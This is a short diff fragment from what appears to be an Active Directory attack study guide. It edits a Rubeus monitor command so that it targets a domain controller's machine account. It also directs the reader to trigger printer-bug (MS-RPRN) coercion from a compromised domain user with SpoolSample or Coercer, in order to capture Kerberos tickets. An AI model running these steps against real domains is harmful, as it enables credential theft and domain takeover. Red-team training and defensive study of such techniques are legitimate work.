@@ -45,7 +45,7 @@ The printer bug uses an RPC call of MS-RPRN which allows any domain user can for
 1. Run on compromised Server Rubeus monitor
 
 ```powershell
-Rubeus.exe monitor /interval:5 /nowrap
+Rubeus.exe monitor /interval:5 /nowrap /targetuser:DCORP-DC$
 ```
 
 2. Run on compromised Domain User the RPC Call using [SpoolSample](https://github.com/leechristensen/SpoolSample) \ [Coercer](https://github.com/p0dalirius/Coercer)
